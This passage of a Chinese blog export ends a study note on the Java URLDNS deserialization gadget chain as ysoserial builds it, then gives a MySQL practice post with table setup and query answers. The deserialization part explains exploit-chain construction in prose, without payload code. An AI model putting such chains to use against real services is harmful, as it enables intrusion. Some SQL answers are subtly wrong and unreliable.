<p>这里handler调用hashCode</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312212429-2hxi1l7.png" alt="image.png"></p>
<p>handler值我们可以在URL对象的构造函数里给</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312212520-kaik0az.png" alt="image.png"></p>
<p>URLStreamHandler是个抽象类，无法直接实例化，这里yeoserial找到了另一个可以使用的类</p>
<h2 id="SilentURLStreamHandler"><a href="#SilentURLStreamHandler" class="headerlink" title="SilentURLStreamHandler"></a>SilentURLStreamHandler</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312212644-1ugkj8i.png" alt="image.png">Java中子类会<strong>覆盖父类的同名方法</strong>，所以我们在子类里重新写了这两个方法，可以避免在ysoserial生成payload的时候发起dns解析造成干扰结果</p>
<p>这样我们可以拿到一个URLStreamHandler实例对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312213316-7s0aoxx.png" alt="image.png"></p>
<h2 id="让hashCode-x3D-1"><a href="#让hashCode-x3D-1" class="headerlink" title="让hashCode &#x3D; -1"></a>让hashCode &#x3D; -1</h2><p>上面遗留下来的问题，在java.net.URL.hashCode()中，如果hasnCode不等于-1，链子的下半部分就无法进行</p>
<p>ysoserial中用反射让hashCode强制赋值为-1</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312213227-vu4uvxg.png" alt="image.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>左边构造的payload可以让我们顺着右边的方法层层取出URLStreamHandler类来调用其getHostAddress方法</p>
<p>漏洞最核心的地方在右边调用链的最最下面，我们上面的所有工作都是为了让其能通过反序列化的readObject方法自动执行链条，这一个上一章讲过</p>
<blockquote>
<p>所以要一直找利用类，来满足我们：</p>
<p>调用私有方法</p>
<p>让链条可以顺利在我们想要的路上进行，不会被条件搞乱</p>
<p>从最外层开始到内部的核心数据不改变</p>
<p>等等等等（因为还是初学所以暂时总结，马上去找大师傅的心法</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312213751-b1rhx5s.png" alt="image.png"></p>
<p>所以首先要调试链子，然后再去分析，分析是建立在调试的基础上的，以后自主审计是另一回事，但是学习过程中先要调试。</p>
<p>分析的时候看着前人挖出来的链子才能知道他为什么找这些类。</p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sql查询练习题</title>
    <url>/2022/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%B0%8F%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>mysql5.7</p>
<h2 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531082203-jjtpi3u.png" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">	Sno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">	sname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	sbirth DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	ssex <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	Sdept <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> teacher (</span><br><span class="line">	Tno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">	Tname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> course (</span><br><span class="line">	Cno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">	Cname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">	Tno <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	<span class="keyword">FOREIGN</span> KEY course(Tno) <span class="keyword">REFERENCES</span> Teacher(Tno)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sc (</span><br><span class="line">	Sno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	Cno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	Score <span class="type">INT</span>,</span><br><span class="line">	<span class="keyword">PRIMARY</span> KEY(Sno, CNo),</span><br><span class="line">	<span class="keyword">FOREIGN</span> KEY sc(Sno) <span class="keyword">REFERENCES</span> student(Sno),</span><br><span class="line">	<span class="keyword">FOREIGN</span> KEY sc(Cno) <span class="keyword">REFERENCES</span> course(cno)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="comment">--插入学生表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;赵雷&#x27;</span> , <span class="string">&#x27;1990-01-01&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;网安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;钱电&#x27;</span> , <span class="string">&#x27;1990-12-21&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;网安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;孙风&#x27;</span> , <span class="string">&#x27;1990-05-20&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;李云&#x27;</span> , <span class="string">&#x27;1990-08-06&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;周梅&#x27;</span> , <span class="string">&#x27;1991-12-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;吴兰&#x27;</span> , <span class="string">&#x27;1992-03-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;治安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;郑竹&#x27;</span> , <span class="string">&#x27;1989-07-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;侦查系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;08&#x27;</span> , <span class="string">&#x27;王菊&#x27;</span> , <span class="string">&#x27;1990-01-20&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;侦查系&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入课程表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;语文&#x27;</span> , <span class="string">&#x27;02&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;数学&#x27;</span> , <span class="string">&#x27;01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;英语&#x27;</span> , <span class="string">&#x27;03&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入教师表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;王五&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入成绩表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">90</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">99</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">70</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">60</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">50</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">30</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">20</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">87</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">31</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">89</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">98</span>);</span><br></pre></td></tr></table></figure>

<h2 id="查询练习"><a href="#查询练习" class="headerlink" title="查询练习"></a>查询练习</h2><p>临时去除ONLY_FULL_GROUP_BY</p>
<p><a href="https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html">https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="variable">@GLOBAL</span>.sql_mode<span class="operator">=</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode <span class="operator">=</span><span class="string">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、查询平均成绩大于等于 <span class="number">60</span> 分的学号和平均成绩</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) <span class="keyword">as</span> avgScore <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> avgScore <span class="operator">&gt;=</span> <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">如果要一起查姓名：</span><br><span class="line">##先过滤sc表里的成绩再和student链接查数据</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname,a.av <span class="keyword">from</span> student </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> (</span><br><span class="line">	<span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score)<span class="keyword">AS</span> av  <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Score)<span class="operator">&gt;=</span><span class="number">60</span></span><br><span class="line">	)a</span><br><span class="line"><span class="keyword">on</span> student.Sno <span class="operator">=</span> a.Sno;</span><br><span class="line"></span><br><span class="line">或者直接连接：</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname,<span class="built_in">AVG</span>(b.score) <span class="keyword">as</span> avgScore</span><br><span class="line"><span class="keyword">FROM</span> student a <span class="keyword">JOIN</span> sc b</span><br><span class="line"><span class="keyword">on</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> a.Sno <span class="keyword">and</span> a.sname</span><br><span class="line"><span class="keyword">HAVING</span> avgScore<span class="operator">&gt;=</span><span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、查询在 SC 表有成绩的学生信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> sc.Sno,student.sname <span class="keyword">FROM</span> sc <span class="keyword">INNER</span> <span class="keyword">JOIN</span> student <span class="keyword">on</span> sc.Sno <span class="operator">=</span> student.Sno <span class="keyword">WHERE</span> sc.Score <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line">或者连接起来查</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname <span class="keyword">from</span> student a </span><br><span class="line"><span class="keyword">JOIN</span>(<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno <span class="keyword">from</span> sc <span class="keyword">WHERE</span> Score <span class="operator">&gt;</span> <span class="number">0</span>)b <span class="keyword">on</span> a.Sno<span class="operator">=</span>b.Sno</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、查询姓“李”的老师的信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname REGEXP &quot;^李&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> &quot;李%&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> CONCAT(&quot;李&quot;,&quot;%&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、统计姓“李”的老师的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Tname) num  <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> &quot;李%&quot;;</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、查询所有学生的平均成绩并以降序显示。</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) score <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname,b.score <span class="keyword">from</span> student a</span><br><span class="line"><span class="keyword">JOIN</span>(<span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) score <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno)b</span><br><span class="line"><span class="keyword">on</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、统计男生和女生的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot;<span class="keyword">FROM</span> student</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、统计侦查系男生和女生的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="operator">&amp;&amp;</span> Sdept <span class="operator">=</span> &quot;侦查系&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="operator">&amp;&amp;</span> Sdept <span class="operator">=</span> &quot;侦查系&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot;  <span class="keyword">FROM</span> student</span><br><span class="line">或者先筛表</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot; <span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span>&quot;侦查系&quot;) a</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、查询姓名中含有“雷”字的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> sname REGEXP &quot;雷&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> sname <span class="keyword">LIKE</span> &quot;%雷%&quot;</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、查询现年龄大于<span class="number">30</span>岁的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> <span class="keyword">YEAR</span>(<span class="built_in">CURRENT_DATE</span>())<span class="operator">-</span><span class="keyword">YEAR</span>(sbirth)<span class="operator">&gt;</span><span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、查询平均成绩大于<span class="number">80</span>的学生学号和姓名。</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname <span class="keyword">from</span> student </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> (</span><br><span class="line">	<span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score)<span class="keyword">AS</span> av  <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Score)<span class="operator">&gt;=</span><span class="number">80</span></span><br><span class="line">	)a</span><br><span class="line"><span class="keyword">on</span> student.Sno <span class="operator">=</span> a.Sno;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="number">11</span>、查询平均成绩大于<span class="number">80</span>的学生学号、姓名和平均成绩。（派生表）</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname,<span class="built_in">AVG</span>(sc.Score) <span class="keyword">from</span> student,sc </span><br><span class="line"><span class="keyword">WHERE</span> student.Sno <span class="operator">=</span> sc.Sno <span class="keyword">GROUP</span> <span class="keyword">BY</span> student.Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(sc.Score)<span class="operator">&gt;</span><span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、统计选修了语文课的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> Cno<span class="operator">=</span>&quot;02&quot; <span class="operator">&amp;&amp;</span> Score<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> sc</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Cno) <span class="keyword">FROM</span> sc <span class="keyword">where</span> Cno<span class="operator">=</span>&quot;02&quot; <span class="operator">&amp;&amp;</span> Score<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、统计至少选修了<span class="number">2</span>号课和<span class="number">3</span>号课的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Sno) <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno <span class="operator">=</span> &quot;02&quot; <span class="keyword">and</span> Sno <span class="keyword">in</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno<span class="operator">=</span>&quot;03&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>、统计至少选修了<span class="number">3</span>门课程的学生人数。</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">COUNT</span>(Cno)<span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(Cno)<span class="operator">=</span><span class="number">3</span>;</span><br><span class="line">#问题：怎么排除成绩为<span class="keyword">null</span>的情况</span><br><span class="line"></span><br><span class="line"><span class="number">15</span>、统计每一门选修人数，并显示超过<span class="number">5</span>人的课程。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">COUNT</span>(Cno) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno <span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(Cno)<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span>、在SC中插入一条学号为<span class="number">07</span>的学生选修<span class="number">01</span>号课程的记录。</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc(Sno,Cno) <span class="keyword">VALUES</span>(&quot;07&quot;,&quot;01&quot;);</span><br><span class="line"></span><br><span class="line"><span class="number">17</span>、删除所有男生的选课课程成绩。</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Sno <span class="keyword">in</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> ssex<span class="operator">=</span>&quot;男&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">18</span>、将所有女生的成绩修改成<span class="keyword">NULL</span>。</span><br><span class="line"><span class="keyword">UPDATE</span> sc <span class="keyword">SET</span> Score <span class="operator">=</span> <span class="keyword">NULL</span> <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> ssex<span class="operator">=</span>&quot;女&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">19</span>、查询所有学生的学号、性别、选修课程以及成绩。</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.ssex,b.Cno,b.Score</span><br><span class="line"><span class="keyword">FROM</span> student <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sc <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">ON</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"></span><br><span class="line"><span class="number">20</span>、查询每门课的最高成绩。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">MAX</span>(Score) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno</span><br><span class="line"></span><br><span class="line"><span class="number">21</span>、查询每门课的平均成绩。</span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">AVG</span>(Score) <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>、查询数学成绩低于<span class="number">90</span>的学生信息。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> sc <span class="keyword">WHERE</span> Cno<span class="operator">=</span>&quot;01&quot;<span class="operator">&amp;&amp;</span>Score<span class="operator">&lt;</span><span class="number">90</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>database</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
